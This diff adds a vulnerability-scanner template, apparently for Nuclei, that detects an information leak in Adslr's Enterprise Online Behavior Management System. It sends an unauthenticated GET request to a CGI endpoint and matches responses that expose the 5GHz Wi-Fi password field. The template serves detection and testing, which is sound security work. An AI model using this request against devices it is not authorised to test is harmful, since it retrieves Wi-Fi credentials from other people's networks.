@@ -1,0 +1,22 @@
+id: poc-adslr-eobm-info-leak
+
+info:
+  name: Adslr Enterprise Online Behavior Management System Information Leak Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/request_para.cgi?parameter=wifi_get_5g_host"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "wl_passwd_5g"
+        part: body
+      - type: word
+        words:
+          - "\"wl_safe_5g\""
+        part: body
